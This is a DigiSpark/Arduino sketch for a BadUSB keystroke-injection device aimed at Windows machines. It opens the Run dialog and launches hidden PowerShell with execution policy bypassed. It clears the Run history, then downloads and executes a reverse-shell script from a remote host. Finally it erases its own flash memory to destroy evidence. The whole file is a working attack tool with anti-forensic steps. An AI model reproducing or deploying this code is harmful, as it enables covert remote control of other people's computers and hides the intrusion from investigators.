#include "avr/io.h"
#include "avr/interrupt.h"
#include "DigiKeyboard.h"

// self destruct SMC (erase all flash)
void shred()
{
    cli();
    while (EECR & (1 << EEPE))
        ;
    uint16_t flash = 0;
    while (1)
    {
        SPMCSR = (1 << PGERS) | (1 << SPMEN);
        __asm__ __volatile__("spm\n "
                             :
                             : "z"(flash));
        flash += SPM_PAGESIZE;
    }
    while (1)
        ;
}

void setup()
{
    // reset
    DigiKeyboard.sendKeyStroke(0);
    // open run
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    // obfuscation via cmd and hidden powershell option
    DigiKeyboard.print("cmd /c start /min \"\" powershell -NoP -NonI -Exec Bypass -W Hidden ");
    DigiKeyboard.delay(100);
    // erase run history
    DigiKeyboard.print("Remove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU -Name *;");
    DigiKeyboard.delay(100);
    // run remote reverse shell script
    DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://X.X.X.X/shell.ps1')");
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    // done
    pinMode(1, OUTPUT);
    digitalWrite(1, HIGH);
    // self destruct
    shred();
}

void loop()
{
}